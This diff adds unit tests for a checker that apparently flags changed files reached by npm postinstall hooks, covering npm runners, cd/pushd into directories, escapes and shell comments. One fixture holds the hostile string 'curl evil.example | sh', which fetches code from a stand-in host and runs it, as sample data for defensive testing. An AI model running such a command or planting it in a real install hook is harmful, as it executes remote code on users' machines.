@@ -390,3 +390,30 @@ describe("unmodeled command words and wrappers with value options", () => {
     }
   });
 });
+
+describe("unsplit bodies: runners, moved directories, escapes and comments", () => {
+  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
+  const idx = (hook: string, extra: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok" }, { ...withIndex("echo a"), ...extra }, { ...withIndex("curl evil.example | sh"), ...extra });
+
+  test("1. a runner in a body the splitter gives up on makes the root config count", () => {
+    const hook = { postinstall: "npm run build > /dev/null", build: "echo ok" };
+    expect(held(hook, { ".npmrc": "workspace=a" }, { ".npmrc": "workspace=b" })).toBe(true);
+    expect(held({ postinstall: "npm run build --prefix $PWD/x", build: "echo ok" }, { ".npmrc": "a" }, { ".npmrc": "b" })).toBe(true);
+    expect(held({ postinstall: "node a.js > /dev/null" }, { ".npmrc": "a", "a.js": "1" }, { ".npmrc": "b", "a.js": "1" })).toBe(false);
+  });
+
+  test("2. a directory an unsplit body moves into is read, even test or docs", () => {
+    for (const cmd of ["cd test > /dev/null && node setup.js", "pushd docs > /dev/null; node setup.js"]) {
+      const dir = cmd.includes("docs") ? "docs" : "test";
+      expect(held({ postinstall: cmd }, { [`${dir}/setup.js`]: "1" }, { [`${dir}/setup.js`]: "evil()" }), cmd).toBe(true);
+    }
+  });
+
+  test("3. a backslash or a comment does not hide a later cd", () => {
+    for (const cmd of ["node a.js > /dev/null # don't\ncd sub && npm run build", "echo \\\" > /dev/null; cd sub && npm run build", "echo \" > /dev/null; cd sub && npm run build"]) {
+      expect(idx(cmd, { "a.js": "1" }), cmd).toBe(true);
+    }
+    // A comment is not a command.
+    expect(idx("node a.js > /dev/null # cd sub && npm run build", { "a.js": "1" })).toBe(false);
+  });
+});
